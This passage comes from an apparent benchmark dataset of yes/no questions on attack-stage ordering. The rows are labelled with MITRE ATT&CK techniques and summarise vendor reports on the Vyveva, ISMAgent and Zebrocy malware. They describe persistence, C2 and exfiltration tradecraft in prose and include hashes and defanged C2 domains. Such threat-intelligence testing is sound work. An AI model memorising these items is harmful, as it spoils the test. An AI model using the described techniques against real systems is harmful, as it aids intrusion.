Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
388,15,15-Command and Control-T1573-Encrypted Channel,"After Vyveva's backdoor compresses files with zlib for exfiltration during the Collection phase, is it likely to encrypt C&C traffic using the XOR operation in the Command and Control phase?","Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
391,15,15-Collection-T1560-Archive Collected Data,"After obtaining file and directory listings, obtaining the local IP address, and retrieving system time and time zone, is it likely that Vyveva's backdoor will compress files before exfiltrating them to the C&C server?","Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
392,15,15-Collection-T1005-Data from Local System,"After obtaining system information such as computer name, ANSI code page, OS version, architecture, and the local IP address, is it likely that Vyveva's backdoor will collect files from the computer before compressing them with zlib for transmission to the C&C server?","Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
393,15,15-Collection-T1025-Data from Removable Media,"After obtaining information such as the local IP address and system time through discovery, is Vyveva's backdoor likely to collect files from newly inserted removable media and notify the C&C about these files before compressing the collected files and sending them to the C&C server?","Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
394,15,15-Exfiltration-T1041-Exfiltration Over C2 Channel,"After compressing files with zlib for collection during the Collection tactic, is it likely that Vyveva will exfiltrate data to its C&C server over the communication channel via Tor as part of the Exfiltration tactic?",Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).,"Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
407,152,152-Initial Access-T1566-Phishing,Is it likely that the malicious Excel file attached to the delivery email contained a macro designed to display a fake invoice while running malicious code in the background to install ISMAgent after actors associated with the OilRig campaign sent phishing emails to targeted individuals?,"Initial Access: On July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted Middle Eastern technology organization. All emails had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).","Execution: The Excel file attached to the delivery email contained a malicious macro that, when enabled, would unhide and display a new worksheet with a fake invoice for Citrix products. While displaying the decoy invoice, the macro would silently run malicious code in the background to install its payload. The payload, a variant of the ISMDoor Trojan tracked as ISMAgent (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9), was written to the file %PUBLIC%\Libraries\servicereset.exe after concatenating base64 encoded strings. A VBScript named %PUBLIC%\Libraries\OfficeServicesStatus.vbs was created to execute the 'servicereset.exe' file using the command line. A scheduled task named 'OfficeServicesStatus' was set to run every three minutes for persistence.
Persistence: A scheduled task named 'OfficeServicesStatus' was created to run every three minutes, ensuring the persistence of the ISMAgent payload on the compromised system.
Defense Evasion: The attack utilized a fake compatibility warning message and a decoy invoice document to trick the user and minimize suspicions of malicious activity. The malicious macro was designed to silently install the ISMAgent payload while displaying the decoy document.
Command and Control: The ISMAgent Trojan used HTTP requests and DNS tunneling to communicate with its C2 server. The Trojan parsed received data from the C2 server for a GUID field and commands to run on the compromised system. The C2 server issued commands such as system information gathering and network configuration discovery. The Trojan executed the commands using cmd.exe and sent the output back to the C2 server via HTTP POST requests. The C2 domain used for the attack was ntpupdateserver[.]com, with additional infrastructure including microsoft-publisher[.]com and adobeproduct[.]com.
Others: The OilRig campaign, potentially linked to the Greenbug threat group, has shown iterative behavior in their toolset, maintaining some similarities over time. The inclusion of ISMAgent within the OilRig toolset suggests stronger relationships between various groups operating in the Middle East. Palo Alto Networks customers are protected from these threats with classified samples by WildFire, IPS signatures, and AutoFocus tags. Indicators of Compromise (IoCs) include various SHA256 hashes of Clayslide documents delivering ISMAgent, ISMAgent payloads, and related infrastructure domains.",Yes,unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group
415,152,152-Command and Control-T1572-Protocol Tunneling,"After the ISMAgent Trojan achieves persistence through a scheduled task set to run every three minutes, is it likely to use DNS tunneling for command and control communication with its C2 server before executing commands such as system information gathering using cmd.exe?","Command and Control: The ISMAgent Trojan used HTTP requests and DNS tunneling to communicate with its C2 server. The Trojan parsed received data from the C2 server for a GUID field and commands to run on the compromised system. The C2 server issued commands such as system information gathering and network configuration discovery. The Trojan executed the commands using cmd.exe and sent the output back to the C2 server via HTTP POST requests. The C2 domain used for the attack was ntpupdateserver[.]com, with additional infrastructure including microsoft-publisher[.]com and adobeproduct[.]com.","Initial Access: On July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted Middle Eastern technology organization. All emails had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).
Execution: The Excel file attached to the delivery email contained a malicious macro that, when enabled, would unhide and display a new worksheet with a fake invoice for Citrix products. While displaying the decoy invoice, the macro would silently run malicious code in the background to install its payload. The payload, a variant of the ISMDoor Trojan tracked as ISMAgent (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9), was written to the file %PUBLIC%\Libraries\servicereset.exe after concatenating base64 encoded strings. A VBScript named %PUBLIC%\Libraries\OfficeServicesStatus.vbs was created to execute the 'servicereset.exe' file using the command line. A scheduled task named 'OfficeServicesStatus' was set to run every three minutes for persistence.
Persistence: A scheduled task named 'OfficeServicesStatus' was created to run every three minutes, ensuring the persistence of the ISMAgent payload on the compromised system.
Defense Evasion: The attack utilized a fake compatibility warning message and a decoy invoice document to trick the user and minimize suspicions of malicious activity. The malicious macro was designed to silently install the ISMAgent payload while displaying the decoy document.
Others: The OilRig campaign, potentially linked to the Greenbug threat group, has shown iterative behavior in their toolset, maintaining some similarities over time. The inclusion of ISMAgent within the OilRig toolset suggests stronger relationships between various groups operating in the Middle East. Palo Alto Networks customers are protected from these threats with classified samples by WildFire, IPS signatures, and AutoFocus tags. Indicators of Compromise (IoCs) include various SHA256 hashes of Clayslide documents delivering ISMAgent, ISMAgent payloads, and related infrastructure domains.",Yes,unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group
416,152,152-Persistence-T1053-Scheduled Task/Job,"After executing the ISMAgent payload via the VBScript named %PUBLIC%\Libraries\OfficeServicesStatus.vbs, is it likely that OilRig will create a scheduled task named 'OfficeServicesStatus' to ensure the persistence of the ISMAgent payload before the Trojan communicates with its C2 server via HTTP requests and DNS tunneling?","Persistence: A scheduled task named 'OfficeServicesStatus' was created to run every three minutes, ensuring the persistence of the ISMAgent payload on the compromised system.","Initial Access: On July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted Middle Eastern technology organization. All emails had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).
Execution: The Excel file attached to the delivery email contained a malicious macro that, when enabled, would unhide and display a new worksheet with a fake invoice for Citrix products. While displaying the decoy invoice, the macro would silently run malicious code in the background to install its payload. The payload, a variant of the ISMDoor Trojan tracked as ISMAgent (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9), was written to the file %PUBLIC%\Libraries\servicereset.exe after concatenating base64 encoded strings. A VBScript named %PUBLIC%\Libraries\OfficeServicesStatus.vbs was created to execute the 'servicereset.exe' file using the command line. A scheduled task named 'OfficeServicesStatus' was set to run every three minutes for persistence.
Defense Evasion: The attack utilized a fake compatibility warning message and a decoy invoice document to trick the user and minimize suspicions of malicious activity. The malicious macro was designed to silently install the ISMAgent payload while displaying the decoy document.
Command and Control: The ISMAgent Trojan used HTTP requests and DNS tunneling to communicate with its C2 server. The Trojan parsed received data from the C2 server for a GUID field and commands to run on the compromised system. The C2 server issued commands such as system information gathering and network configuration discovery. The Trojan executed the commands using cmd.exe and sent the output back to the C2 server via HTTP POST requests. The C2 domain used for the attack was ntpupdateserver[.]com, with additional infrastructure including microsoft-publisher[.]com and adobeproduct[.]com.
Others: The OilRig campaign, potentially linked to the Greenbug threat group, has shown iterative behavior in their toolset, maintaining some similarities over time. The inclusion of ISMAgent within the OilRig toolset suggests stronger relationships between various groups operating in the Middle East. Palo Alto Networks customers are protected from these threats with classified samples by WildFire, IPS signatures, and AutoFocus tags. Indicators of Compromise (IoCs) include various SHA256 hashes of Clayslide documents delivering ISMAgent, ISMAgent payloads, and related infrastructure domains.",Yes,unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group
422,153,153-Defense Evasion-T1027-Obfuscated Files or Information,"During cyber attacks, after adversaries install malware such as Emotet and Agent Tesla to facilitate activities like reconnaissance and lateral movement, is it likely that they will use encrypted HTTPS connections to deliver obfuscated malware for defense evasion?","Defense Evasion: Adversaries have been using various defense evasion techniques, including the use of encrypted HTTPS connections to deliver malware, as reported in the ENISA Threat Landscape. This makes it challenging for security systems to detect and prevent such threats.","Reconnaissance: The ENISA Threat Landscape report indicates that adversaries have been actively gathering information to support their cyber operations. This includes exploiting known vulnerabilities and using social engineering techniques such as phishing to collect sensitive data. The Lazarus Group, for example, has been reported to be more active in both financially and espionage motivated attacks, targeting cryptocurrency trading platform users and their systems. The report also mentions that adversaries have been targeting the technology industry to compromise the supply chain and look for vulnerabilities to exploit.
Initial Access: The report details several incidents where adversaries gained initial access through various means. Notably, the MEGA cloud service suffered a data breach exposing a vast number of emails and passwords. Verification.io experienced a significant data breach due to an unprotected MongoDB database, exposing over 800 million records. The Citrix systems were compromised by exploiting critical software vulnerabilities and employing password spraying techniques. Additionally, the cloud hosting provider iNSYNQ was attacked with ransomware, preventing customers from accessing their data.
Execution: The report highlights that installing malware is a common technique used by adversaries during the execution phase of an attack. Malware such as Emotet and Agent Tesla were frequently used to facilitate reconnaissance, lateral movement, data theft, and communication with C2 servers.
Credential Access: Credential stealing has been a significant part of cyberattacks, with adversaries using various methods to obtain sensitive authentication data. The report mentions that companies experience an average of 12 credential-stuffing attacks each month, where attackers successfully identify valid credentials.
Others: The ENISA Threat Landscape report discusses the impact of the COVID-19 pandemic on cybersecurity, noting an increase in attacks targeting healthcare service providers and remote workers. The Brno University Hospital in the Czech Republic, a major COVID-19 testing laboratory, suffered a cyberattack during the pandemic. ENISA has been mapping the threat landscape during this period and advising on mitigation measures to reduce exposure to threats.",Yes,ETL2020_Incidents_A4
425,154,154-Execution-T1106-Native API,"Is it likely that the Sednit group will gain initial access through email attachments containing malicious documents using VBA macros to download and run the first stage payload before executing malware via the Delphi downloader, which creates a process using the Windows API CreateProcess function?","Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
426,154,154-Persistence-T1547-Boot or Logon Autostart Execution,"After deploying a malicious email attachment and using VBA macros to download and run the first-stage payload for initial access, is it likely that the Sednit group will create processes with 'cmd.exe /c SYSTEMINFO & TASKLIST' as arguments during execution before achieving persistence through the Windows registry entry as implemented by the Delphi downloader?","Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
431,154,154-Discovery-T1082-System Information Discovery,"After disguising their email attachments with document-like filenames and icons to gain initial access, is the Sednit group likely to execute the Delphi downloader to perform system commands and gather initial system information before the AutoIt downloader conducts extensive reconnaissance and detects sandbox or virtual environments?","Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
